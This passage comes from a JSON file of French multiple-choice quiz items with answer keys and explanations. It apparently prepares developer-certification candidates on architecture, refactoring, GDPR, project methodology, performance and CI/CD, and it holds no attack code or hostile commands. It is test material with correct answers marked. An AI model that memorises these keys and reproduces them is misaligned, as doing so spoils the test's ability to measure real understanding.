terme.\nC'est pourquoi de nombreuses organisations envisagent ou adoptent des architectures plus modulaires, comme les microservices, qui offrent une plus grande indépendance entre les composants du système et facilitent les mises à jour et l'évolutivité."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Qu'est-ce que le refactoring ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une méthode pour réécrire le code dans un nouveau langage",
                "Un processus pour ajouter de nouvelles fonctionnalités sans tests",
                "Le refactoring est le processus de restructuration du code existant sans modifier son comportement externe",
                "Une pratique qui consiste à supprimer des modules critiques pour simplifier le code"
            ],
            "correct": 2,
            "explanation": "Le refactoring est le processus de restructuration du code existant sans modifier son comportement externe.\nIl réduit la dette technique , simplifie la structure du code et améliore sa lisibilité, ce qui facilite la compréhension et la modification par les développeurs.\nAussi, un code bien structuré est plus facile à maintenir, ce qui réduit les coûts à long terme associés aux modifications et aux corrections de bugs.\nIl permet aux logiciels de rester adaptables face aux évolutions technologiques, prolongeant ainsi leur durée de vie utile.\nLe terrain est ainsi préparé pour l'intégration de nouvelles fonctionnalités en réduisant l'introduction de nouvelles erreurs.\n\nEnfin, un code propre et bien organisé facilite la collaboration au sein des équipes de développement, car il est plus facile pour les développeurs de comprendre et de travailler sur le même code."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Qu'est-ce qu'un microservice ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une approche qui regroupe toutes les fonctionnalités dans un seul programme",
                "Un service externalisé uniquement pour le support technique",
                "Le principe de microservices est une approche architecturale de développement logiciel qui consiste à concevoir une application comme un ensemble de petits services indépendants et faiblement couplés",
                "Un logiciel qui fonctionne exclusivement sur un serveur central"
            ],
            "correct": 2,
            "explanation": "Le principe de microservices est une approche architecturale de développement logiciel qui consiste à concevoir une application comme un ensemble de petits services indépendants et faiblement couplés.\n Chaque microservice est responsable d'une fonctionnalité spécifique et peut être développé, déployé et mis à l'échelle de manière autonome.\n On peut retenir plusieurs atouts pour une telle architecture.\n\t1. La Modularité car l'application est divisée en modules indépendants, chacun gérant une fonction métier spécifique.\n\t2. L' Indépendance car chaque microservice peut être développé, déployé et mis à jour sans affecter les autres services.\n\t3. La Communication car les microservices communiquent entre eux via des API bien définies, généralement en utilisant des protocoles légers comme HTTP/REST.\n\t4. L' Autonomie technologique car chaque microservice peut être développé avec la technologie la plus appropriée pour sa fonction, permettant une flexibilité dans le choix des langages et des outils.\n\t5. L' Évolutivité car les microservices peuvent être mis à l'échelle individuellement en fonction des besoins, optimisant ainsi l'utilisation des ressources.\n\t6. La Résilience , enfin car la défaillance d'un service n'affecte pas nécessairement l'ensemble de l'application, améliorant ainsi la robustesse globale du système.\nCette approche contraste avec l'architecture monolithique traditionnelle où toutes les fonctionnalités sont regroupées dans une seule et grande application.\nLes microservices offrent une plus grande agilité, facilitent l'innovation continue et permettent une meilleure gestion des applications complexes et évolutives."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Les différents types d'architectures logicielles",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Toutes les architectures sont identiques et ne dépendent pas des besoins du projet",
                "Une seule architecture peut répondre à tous les types de logiciels",
                "Les architectures sont définies uniquement par le langage de programmation utilisé",
                "Il existe plusieurs types d' architectures logicielles couramment utilisés dans le développement de systèmes informatiques"
            ],
            "correct": 3,
            "explanation": "Il existe plusieurs types d' architectures logicielles couramment utilisés dans le développement de systèmes informatiques.\n\t1. L' Architecture monolithique est composée d'une application unique et autonome où tous les composants sont étroitement couplés.\nElle est simple à développer et à déployer, mais peut devenir difficile à maintenir et à faire évoluer à mesure que l'application grandit.\n\t2. L' Architecture en couches organise l'application système est divisé en couches horizontales, chacune ayant une responsabilité spécifique (par exemple, IHM, BO, DAL et BLL).\nCette approche favorise la séparation des préoccupations et la réutilisation du code.\n\t3. L' Architecture en microservices divise l'application en services plus petits et plus spécialisés, chacun fonctionnant de manière indépendante.\nCette approche offre une grande flexibilité et facilite le déploiement continu.\n\t4. L' Architecture événementielle est fondée sur la production, la détection et la consommation d'événements.\nElle est particulièrement adaptée aux systèmes réactifs et en temps réel.\n\t5. L' Architecture centrée sur les données met l'accent sur l'organisation et la gestion des données au cœur du système.\nElle est couramment utilisée dans les applications de gestion et les systèmes d'information.\n\t6. L' Architecture modulaire scinde l'application en modules indépendants et interchangeables, facilitant la maintenance et l'évolution du système.\nLe choix de l'architecture dépend souvent des besoins spécifiques du projet, de l'échelle de l'application, et des contraintes techniques et organisationnelles.\nIl n'est pas rare de combiner plusieurs de ces approches dans un même système pour tirer parti de leurs avantages respectifs."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Qu'est-ce que le RGPD et quelles sont ses implications majeures pour le développement d'une application ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un protocole réseau pour sécuriser les transferts de fichiers entre l'Europe et l'Asie.",
                "Le Règlement Général sur la Protection des Données, imposant le consentement, le droit à l'oubli, et de préférence l'hébergement en Europe.",
                "Une norme CSS garantissant l'accessibilité des formulaires pour les personnes en situation de handicap.",
                "Un framework JavaScript utilisé pour crypter automatiquement les bases de données SQL."
            ],
            "correct": 1,
            "explanation": "Le RGPD (Règlement Général sur la Protection des Données) encadre le traitement des données personnelles en Europe. Ses piliers majeurs incluent le recueil du consentement clair de l'utilisateur, le droit à l'oubli (suppression complète des données sur demande) et le fait de stocker les données personnelles au sein de l'Union Européenne (ou pays assurant un niveau de protection adéquat)."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Si un utilisateur exerce son 'droit à l'oubli' (RGPD) et demande la suppression de ses données personnelles, comment doit-on gérer ses factures et données comptables ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "On supprime immédiatement toutes ses factures pour effacer toute trace de son existence.",
                "On conserve les factures telles quelles car la comptabilité est prioritaire sur les droits d'accès.",
                "On anonymise les données personnelles sur les factures tout en conservant les pièces comptables pour respecter les obligations légales de conservation.",
                "On transfère automatiquement les factures sur un serveur hors Union Européenne pour contourner le RGPD."
            ],
            "correct": 2,
            "explanation": "Le droit à l'oubli n'est pas absolu. Les obligations légales et fiscales (comme la conservation des factures pendant 10 ans en France) l'emportent sur la suppression. La bonne pratique consiste à anonymiser les profils utilisateurs mais à conserver les données de facturation sous forme anonymisée ou à appliquer des règles de conservation spécifiques conformes aux exigences comptables."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "En gestion de projet, comment peut-on optimiser l'utilisation du diagramme de Gantt pour évaluer le déroulement réel des tâches ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En le supprimant dès que le développement commence pour ne pas stresser l'équipe.",
                "En prenant une 'photo' (baseline) du diagramme initial pour la comparer avec le diagramme réel en fin de projet.",
                "En modifiant quotidiennement les dates de début sans conserver d'historique des changements.",
                "En affichant uniquement les tâches déjà terminées pour rassurer le client."
            ],
            "correct": 1,
            "explanation": "Le diagramme de Gantt sert à planifier. Pour en tirer le meilleur parti, il est recommandé de figer la planification initiale (prendre une baseline ou 'photo' de départ) et de la comparer avec la planification réelle à la fin du projet. Cela permet d'identifier les écarts (retards, sous-estimations) et d'améliorer les estimations des futurs projets."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Quelles sont les réglementations principales à respecter sur un site web ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Seulement le référencement SEO et les normes de couleur.",
                "L'accessibilité numérique (WCAG), la protection des données (RGPD), et la conformité aux règles commerciales et fiscales applicables.",
                "Uniquement la compatibilité avec les navigateurs modernes.",
                "La seule réglementation est la présence d'un certificat SSL."
            ],
            "correct": 1,
            "explanation": "Un site web doit notamment respecter les règles d'accessibilité afin de permettre l'usage du service par le plus grand nombre, les obligations de protection des données personnelles (RGPD), ainsi que les règles commerciales, fiscales et de sécurité applicables au secteur concerné. La conformité n'est pas limitée au design ou au SEO : elle couvre aussi la gestion des données, la transparence et l'inclusivité."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Quelles sont les trois choses essentielles à respecter pour être conforme au RGPD ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le consentement, le droit à l'oubli et la minimisation des données.",
                "Le chiffrement, la redondance et la disponibilité.",
                "L'hébergement en France, le suivi des utilisateurs et la publicité ciblée.",
                "Le nom de domaine, la charte graphique et le certificat SSL."
            ],
            "correct": 0,
            "explanation": "Pour être conforme au RGPD, il faut en général : un consentement clair et libre pour la collecte des données, le respect du droit à l'oubli et de la suppression des données personnelles sur demande, et la minimisation des données collectées à ce qui est strictement nécessaire. Ces principes visent à protéger la vie privée et à limiter le traitement inutile des données."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Si un utilisateur achète une arme sur un site et commet un crime, puis efface ses données sur le site marchand, comment la justice peut-elle encore retrouver sa trace ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Le site peut simplement supprimer toutes ses données sans laisser d'empreinte visible.",
                "La justice peut remonter à la personne via les données de transaction conservées, les logs, les factures et les éléments d'identification techniques, même si l'utilisateur tente d'effacer ses données utilisateur.",
                "La justice ne peut rien faire car le RGPD impose de supprimer toutes les traces immédiatement.",
                "Le site marchand n'a aucune obligation légale de conserver des preuves."
            ],
            "correct": 1,
            "explanation": "Le droit à l'oubli ne supprime pas les obligations légales de conservation ou les preuves de transactions nécessaires pour la justice. Les données de paiement, les factures, les logs serveur, les adresses IP, les historiques de commande et les traces techniques peuvent être conservées dans le cadre d'une obligation légale ou d'une enquête. Le RGPD protège les données personnelles, mais il n'empêche pas la conservation de données nécessaires à la preuve, au respect de la loi ou à la prévention des infractions."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Pourquoi avez-vous choisi cette technologie pour votre projet ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce que c'était la technologie la plus tendance au moment du début du projet",
                "Parce que le hasard a décidé et que toute technologie aurait fait l'affaire",
                "Parce que c'était la seule que je connaissais, les autres étant impossibles à apprendre",
                "En reliant le choix au besoin du projet (écosystème, documentation, compétences de l'équipe, contraintes du client) et en assumant les alternatives envisagées ainsi que les critères de décision"
            ],
            "correct": 3,
            "explanation": "Le jury n'évalue pas la technologie, il évalue la capacité à justifier un choix. Grille de réponse :\n1. rappeler le besoin et les contraintes (délais, hébergement, équipe) ;\n2. citer les critères de décision : documentation, communauté, courbe d'apprentissage, maintenabilité, coût, compatibilité avec l'existant ;\n3. mentionner au moins une alternative envisagée et écartée, avec la raison (ex : Symfony plutôt que Laravel pour la structure imposée, ou l'inverse pour la rapidité de démarrage).\nCette structure vaut pour le langage back-end, le framework front, la base de données ou l'outillage : besoin -> critères -> décision assumée."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Pourquoi React plutôt qu'Angular ou Vue ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "React est le seul framework compatible avec les navigateurs modernes",
                "React est plus rapide qu'Angular et Vue dans tous les cas, sans exception",
                "Angular et Vue sont des technologies abandonnées et plus maintenues",
                "React offre une grande flexibilité avec une bibliothèque centrée sur l'UI, un écosystème très riche et une communauté énorme ; Angular propose un cadre complet et structurant, Vue un compromis léger - le choix dépend des besoins de l'équipe et du projet"
            ],
            "correct": 3,
            "explanation": "Points de comparaison honnêtes :\n- React : bibliothèque centrée sur l'UI (virtual DOM, composants, JSX) ; routing, gestion d'état et outillage se composent librement ; écosystème et marché très importants ;\n- Angular : framework complet et structurant (TypeScript natif, injection de dépendances, outillage intégré), adapté aux grandes équipes et aux grosses applications ;\n- Vue : progression douce, documentation très accessible, taille raisonnable.\nRéponse d'oral recommandée : 'pour ce projet, j'avais besoin de X, React répondait par Y, et j'ai écarté Z parce que W'. Dévaloriser les alternatives est un piège : le jury peut les maîtriser mieux que vous."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Pourquoi PHP plutôt que Node.js ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce que Node.js ne sait pas faire de back-end correct",
                "PHP est une technologie morte qui ne peut plus être utilisée sur des projets sérieux",
                "Parce que PHP impose une seule façon d'écrire le back-end, contrairement à Node.js",
                "PHP est simple à déployer, très répandu côté hébergement, doté de frameworks matures (Laravel, Symfony) et adapté à une équipe formée ; Node.js est pertinent si l'équipe maîtrise déjà JavaScript et pour le temps réel - le choix dépend du contexte"
            ],
            "correct": 3,
            "explanation": "Arguments équilibrés :\nPHP :\n- écosystème mature et éprouvé (WordPress, Laravel, Symfony), typage progressif depuis PHP 7/8 ;\n- hébergement abordable et répandu, déploiement simple ;\n- grande communauté francophone (utile en formation).\nNode.js :\n- un seul langage front et back (JavaScript) ;\n- modèle événementiel performant pour les entrées/sorties et le temps réel (chat, notifications, API très sollicitées) ;\n- écosystème npm très vaste.\nLa réponse attendue est contextuelle : compétences de l'équipe, nature du projet (temps réel ou non), hébergement cible. Le jury cherche un choix argumenté, pas un débat 'PHP vs Node' par slogans."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Quelle a été la difficulté principale de votre projet et comment l'avez-vous surmontée ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Je n'ai rencontré aucune difficulté, le projet s'est déroulé sans accroc",
                "J'ai refusé les fonctionnalités difficiles pour ne garder que ce que je savais déjà faire",
                "La difficulté principale a été de choisir la couleur du thème du site",
                "Décrire une difficulté concrète et technique, la démarche de résolution (recherche, documentation, débogage, demandes d'aide) et ce que cela m'a appris"
            ],
            "correct": 3,
            "explanation": "Le jury attend une difficulté réelle et la méthode utilisée pour la résoudre. Structure de réponse :\n1. contexte : la fonctionnalité concernée (ex : un planning avec gestion de créneaux, une jointure complexe, l'authentification) ;\n2. le problème précis : ce qui bloquait, les symptômes ;\n3. la démarche : isoler le problème, formuler des hypothèses, consulter la documentation, déboguer (logs, devtools), tester, demander de l'aide au besoin ;\n4. la résolution et ce qu'elle a appris.\nRépondre 'aucune difficulté' est très mal perçu : soit le projet était trop simple, soit le candidat n'a pas d'esprit d'analyse. L'honnêteté technique est valorisée."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Quel bug avez-vous eu le plus de mal à résoudre ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Je n'ai jamais eu de bug, mon code fonctionne du premier coup",
                "Un bug de fin de projet qui a tout effacé, sans que je sache pourquoi ni comment",
                "J'évite de déboguer : je recommence tout le code depuis le début à chaque erreur",
                "Un bug concret (ex : données non enregistrées, affichage incohérent), résolu en isolant le problème avec des logs et le débogueur, en formulant une hypothèse, en la testant, puis en expliquant la cause racine et la correction"
            ],
            "correct": 3,
            "explanation": "Cette question évalue la méthode de débogage, pas le bug lui-même. Réponse en quatre temps :\n1. décrire le symptôme observable (ex : les commandes s'affichaient sans les noms de clients, certaines données n'étaient jamais enregistrées) ;\n2. la démarche d'isolation : logs côté serveur, onglet Réseau et console du navigateur, requête SQL testée directement dans phpMyAdmin ;\n3. la cause racine identifiée (ex : clé étrangère absente, condition d'upload jamais vraie, cache du navigateur, décalage horaire SQL) ;\n4. la correction et le test de non-régression.\nExemples de bugs difficiles appréciés : un bug qui n'apparaissait qu'en production, un problème de cache ou d'encodage, une boucle infinie silencieuse."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Quelle fonctionnalité vous rend le plus fier dans votre projet ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le header, car il n'a demandé que deux minutes de travail",
                "Aucune, tout le projet est un enchaînement de tutoriels sans valeur",
                "Une fonctionnalité purement décorative qui ne sert à rien mais qui est jolie",
                "Une fonctionnalité visible et utile, choisie parce qu'elle mobilise plusieurs compétences (logique métier, base de données, interface) et répond à un vrai besoin utilisateur"
            ],
            "correct": 3,
            "explanation": "Le jury écoute la capacité à défendre une réalisation. Choisir une fonctionnalité que l'on peut :\n- démontrer rapidement en soutenance ;\n- expliquer techniquement : structure des données, parcours de la requête, points délicats ;\n- relier au besoin utilisateur initial ('les visiteurs voulaient X, j'ai livré Y').\nPréparer : pourquoi cette fonctionnalité, quelles difficultés elle a posées, comment elle a été testée, ce qu'on pourrait améliorer.\nExemples qui passent bien : un module de réservation, une recherche avec filtres, un espace d'administration avec gestion des rôles, un tableau de bord avec statistiques."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Si vous aviez une semaine supplémentaire, que feriez-vous pour améliorer votre projet ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Rien, le projet est parfait et ne peut plus évoluer",
                "Je passerais la semaine à refaire tout le projet avec une autre technologie",
                "J'ajouterais uniquement des fonctionnalités marketing sans lien avec l'usage réel",
                "Je prioriserais des améliorations concrètes : corriger les bugs connus, renforcer la sécurité et les tests, améliorer l'accessibilité et l'ergonomie, optimiser les performances et traiter la dette technique"
            ],
            "correct": 3,
            "explanation": "Cette question mesure la maturité et l'esprit critique vis-à-vis de son propre travail.\nUne bonne réponse hiérarchise, comme un backlog :\n1. fiabiliser : bugs connus, cas limites non gérés ;\n2. sécuriser : validation, contrôle d'accès, données sensibles ;\n3. tester : tests automatisés sur les parties critiques, environnement de recette ;\n4. améliorer l'expérience : accessibilité, ergonomie, performance ;\n5. ensuite seulement : nouvelles fonctionnalités issues des retours utilisateurs.\nLe jury apprécie les candidats qui savent nommer les limites de leur projet : c'est la preuve d'une vraie vision produit, pas d'un travail achevé à la va-vite."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Comment améliorer les performances de votre application web ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En augmentant la taille de la police pour donner une impression de rapidité",
                "En regroupant tout le code dans un seul fichier pour accélérer la compilation",
                "En supprimant la base de données et en stockant les données dans des cookies",
                "En optimisant le front (compression, minification, lazy loading, images adaptées, cache navigateur) et le back (requêtes SQL optimisées, index, pagination, caches serveur)"
            ],
            "correct": 3,
            "explanation": "On distingue l'optimisation front et back.\nFront :\n- minifier et regrouper CSS/JS, charger le JavaScript en defer/async ;\n- lazy loading des images et des contenus hors écran ;\n- formats d'images modernes (WebP) et dimensions adaptées ;\n- cache navigateur et compression (gzip/brotli) côté serveur, CDN pour les ressources statiques.\nBack :\n- limiter le nombre de requêtes (éviter le problème N+1 des ORM), utiliser des jointures ;\n- index sur les colonnes filtrées et jointes ;\n- pagination des listes, caches applicatifs (Redis) pour les données coûteuses.\nRègle d'or : mesurer avant d'optimiser (Lighthouse, DevTools, EXPLAIN des requêtes), puis cibler les vrais goulots d'étranglement."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Pouvez-vous expliquer l'architecture de votre application du début à la fin ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "L'utilisateur agit sur l'interface, une requête HTTP est envoyée, le serveur reçoit la requête, le back-end exécute la logique métier, la base de données est interrogée, le serveur renvoie une réponse, l'interface affiche les données",
                "L'application est un seul bloc de code dans un fichier unique qui gère tout à la fois",
                "Le navigateur contient la base de données et le serveur ne sert que pour les images",
                "Chaque page recharge intégralement l'application depuis zéro, sans aucune logique côté serveur"
            ],
            "correct": 0,
            "explanation": "Le jury veut vérifier la vision d'ensemble. Déroulé attendu, à illustrer avec son propre projet :\n1. découpage : organisation des dossiers (MVC : modèles, vues, contrôleurs, ou composants/services) ;\n2. flux d'une action utilisateur : l'utilisateur agit sur l'interface -> requête HTTP -> routage -> contrôleur -> logique métier -> modèle/requête SQL -> réponse (JSON/HTML) -> affichage ;\n3. points transverses : authentification et middleware de protection des routes, gestion des erreurs, validation ;\n4. choix structurants assumés : architecture, technologies, découpage des responsabilités.\nConseil : répéter ce déroulé sur un exemple précis de son projet (une page, une soumission de formulaire) pour le dérouler de mémoire devant le jury."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Quelle méthodologie avez-vous utilisée : Scrum ou Kanban, et pourquoi ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Aucune méthodologie : chacun travaillait de son côté sans coordination",
                "La méthodologie imposée par le client, sans savoir l'expliquer",
                "Scrum obligatoirement, car c'est la seule méthode reconnue en entreprise",
                "Un choix argumenté selon le contexte : Scrum si le travail se découpe en sprints avec rituels (daily, review, backlog priorisé), Kanban si le flux est continu avec un tableau à colonnes et des limites de travail en cours"
            ],
            "correct": 3,
            "explanation": "Scrum : sprints de 1 à 4 semaines, rôles (product owner, scrum master), rituels (sprint planning, daily, review, retrospective), backlog priorisé - adapté aux projets livrés par itérations.\nKanban : visualisation du flux sur un tableau (à faire / en cours / terminé), limites de travaux en cours (WIP), amélioration continue - adapté au travail continu (maintenance, support, flux de tickets).\nEn projet de formation, on pratique souvent un hybride : tableau Kanban + sprints courts.\nCe que le jury veut entendre : la méthode utilisée, pourquoi elle correspondait au contexte (équipe, périmètre, demandeur), et ce qu'elle a réellement changé (rituels tenus, backlog priorisé, démonstrations régulières)."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Comment avez-vous géré les priorités de votre projet ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Dans l'ordre d'arrivée des idées, sans critère",
                "En commençant toujours par les fonctionnalités les plus faciles, indépendamment de la valeur",
                "En laissant chaque membre choisir librement ses tâches chaque matin",
                "Avec un backlog priorisé par valeur et par risque (MoSCoW : must/should/could/won't), revu régulièrement avec le demandeur pour livrer un maximum de valeur dans le temps imparti"
            ],
            "correct": 3,
            "explanation": "Outils de priorisation :\n- backlog priorisé : le demandeur/product owner arbitre la valeur de chaque tâche ;\n- MoSCoW : Must have (indispensable au fonctionnement), Should have (important), Could have (bonus), Won't have (explicitement écarté) ;\n- matrice valeur/risque : commencer par les fonctionnalités critiques ET risquées pour détecter les problèmes tôt ;\n- découpage en lots livrables.\nIntérêt stratégique : en cas de retard, ce sont les 'could' qui sautent, jamais le coeur du produit.\nEn oral, donner un exemple réel de tâche volontairement repoussée et la raison est un vrai signe de maturité."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Comment avez-vous estimé la charge de travail de votre projet ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En demandant au jury combien de temps il faudrait",
                "En recopiant les estimations d'un projet trouvé sur internet",
                "En prenant systématiquement le double du temps espéré, sans autre analyse",
                "En découpant le travail en tâches fines, en estimant chaque tâche (jours-homme ou story points, planning poker), en intégrant une marge pour les imprévus et en réajustant à partir de la vélocité constatée"
            ],
            "correct": 3,
            "explanation": "Méthodes d'estimation :\n- découpage fin : plus une tâche est petite, plus l'estimation est fiable ;\n- unités : jours-homme ou story points (complexité relative entre tâches) ;\n- estimation collective : planning poker (chacun vote, on discute des écarts, on converge) ;\n- historique : la vélocité (points réellement livrés par sprint) permet de projeter des échéances réalistes ;\n- marge : buffer pour les imprévus, les tests, les revues ;\n- suivi : burndown, diagramme de Gantt, réajustement régulier - l'estimation initiale est une hypothèse, pas un engagement gravé dans le marbre.\nPiège d'oral : annoncer un chiffre exact sans justification ; le jury préfère une méthode + des ajustements assumés."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Comment gérez-vous un changement de besoin en cours de projet ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En refusant tout changement une fois le cahier des charges signé",
                "En réécrivant toute l'application à chaque modification demandée",
                "En cachant les changements au reste de l'équipe jusqu'à la livraison",
                "En évaluant l'impact du changement (charge, délais, architecture), en arbitrant avec le demandeur (valeur vs coût, priorisation du backlog), puis en l'intégrant proprement lors d'une itération suivante avec le code et les tests adaptés"
            ],
            "correct": 3,
            "explanation": "En méthode agile, le changement est attendu, pas subi :\n1. qualifier le besoin : pourquoi ce changement ? besoin réel ou simple reformulation ? ;\n2. évaluer l'impact : charge, délais, effet sur l'architecture et la dette existante ;\n3. arbitrer avec le demandeur : le changement remplace-t-il une tâche existante (re-priorisation) ou décale-t-il le reste (négociation périmètre/délai) ? ;\n4. l'intégrer proprement : mise à jour du backlog, des maquettes, du code et des tests, avec traçabilité (ticket, commit).\nEn méthode classique (cycle en V), le changement passe par une analyse d'impact formelle et une demande de modification contractualisée.\nCe que le jury évalue : la capacité à accueillir le changement sans le subir ni tout casser."
        }
    ],
    "CI/CD & Déploiement": [
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce que l'intégration continue (CI) ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Déployer automatiquement en production",
                "Fusionner régulièrement le code dans un dépôt avec des tests automatisés",
                "Mettre à jour les serveurs manuellement",
                "Créer des environnements de test uniquement"
            ],
            "correct": 1,
            "explanation": "L'intégration continue consiste à intégrer fréquemment du code dans un dépôt partagé avec des tests automatisés pour détecter rapidement les erreurs."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quelle est la principale différence entre CI et CD ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "CI concerne le frontend et CD le backend",
                "CI automatise les tests, CD automatise le déploiement",
                "CI est manuel et CD est automatique",
                "Il n'y a aucune différence"
            ],
            "correct": 1,
            "explanation": "CI (Continuous Integration) automatise les tests et l'intégration, tandis que CD (Continuous Delivery/Deployment) automatise la livraison ou le déploiement."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce qu'un pipeline CI/CD ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un serveur de base de données",
                "Une suite d'étapes automatisées pour tester et déployer une application",
                "Un outil de versioning",
                "Un langage de programmation"
            ],
            "correct": 1,
            "explanation": "Un pipeline CI/CD est une chaîne automatisée qui inclut build, tests et déploiement."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quel est le rôle d'un outil comme Jenkins, GitLab CI ou GitHub Actions ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Écrire du code automatiquement",
                "Automatiser les pipelines CI/CD",
                "Créer des bases de données",
                "Gérer les utilisateurs"
            ],
            "correct": 1,
            "explanation": "Ces outils permettent d'automatiser les étapes de build, test et déploiement."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce que le déploiement continu (Continuous Deployment) ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Déployer uniquement en environnement de test",
                "Déployer automatiquement chaque changement validé en production",
                "Déployer une fois par mois",
                "Déployer manuellement après validation"
            ],
            "correct": 1,
            "explanation": "Le Continuous Deployment déploie automatiquement en production chaque modification validée sans intervention humaine."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "À quoi sert Docker dans un processus de déploiement ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "À écrire du code backend",
                "À containeriser une application pour garantir la portabilité",
                "À remplacer Git",
                "À créer des interfaces utilisateur"
            ],
            "correct": 1,
            "explanation": "Docker permet de créer des conteneurs contenant l'application et ses dépendances pour assurer un déploiement cohérent."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce qu'un environnement de staging ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un environnement de production",
                "Un environnement de test proche de la production",
                "Un environnement local",
                "Un serveur de base de données"
            ],
            "correct": 1,
            "explanation": "Le staging est un environnement miroir de la production utilisé pour valider les fonctionnalités avant mise en ligne."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quel est l'intérêt du versioning dans un processus CI/CD ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Améliorer la performance",
                "Suivre les modifications et permettre les retours arrière",
                "Automatiser les tests",
                "Réduire la taille du code"
            ],
            "correct": 1,
            "explanation": "Le versioning permet de tracer les changements et de revenir à une version stable en cas de problème."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce qu'un rollback en déploiement ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Supprimer une base de données",
                "Revenir à une version précédente de l'application",
                "Mettre à jour un serveur",
                "Redémarrer une application"
            ],
            "correct": 1,
            "explanation": "Un rollback consiste à revenir à une version précédente en cas d'erreur après un déploiement."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Pourquoi automatiser les tests dans une pipeline CI/CD ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Pour ralentir le développement",
                "Pour détecter rapidement les bugs",
                "Pour éviter d'écrire du code",
                "Pour remplacer les développeurs"
            ],
            "correct": 1,
            "explanation": "Les tests automatisés permettent d'identifier rapidement les erreurs et d'assurer la qualité du code."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Qu'est-ce que l'infrastructure as code (IaC) ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Écrire du code frontend",
                "Gérer l'infrastructure via du code versionné",
                "Créer des interfaces graphiques",
                "Automatiser les tests uniquement"
            ],
            "correct": 1,
            "explanation": "L'IaC permet de définir et gérer l'infrastructure (serveurs, réseaux) via du code."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quel est l'intérêt d'utiliser Kubernetes dans un déploiement ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Écrire du code JavaScript",
                "Orchestrer des conteneurs et gérer leur scalabilité",
                "Créer des bases de données",
                "Gérer les utilisateurs"
            ],
            "correct": 1,
            "explanation": "Kubernetes permet d'automatiser le déploiement, la gestion et la mise à l'échelle des conteneurs."
        },
        {
            "theme": "CI/CD & Déploiement",
            "question": "Quelle ressource de référence est-il conseillé de consulter pour connaître et prévenir les failles de sécurité web les plus courantes ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le site officiel du validateur W3C.",
                "Le site de l'OWASP, en particulier son Top 10 des failles de sécurité applicatives.",
                "Les forums de StackOverflow uniquement.",
                "Le référentiel WCAG pour l'accessibilité."
            ],
            "correct": 1,
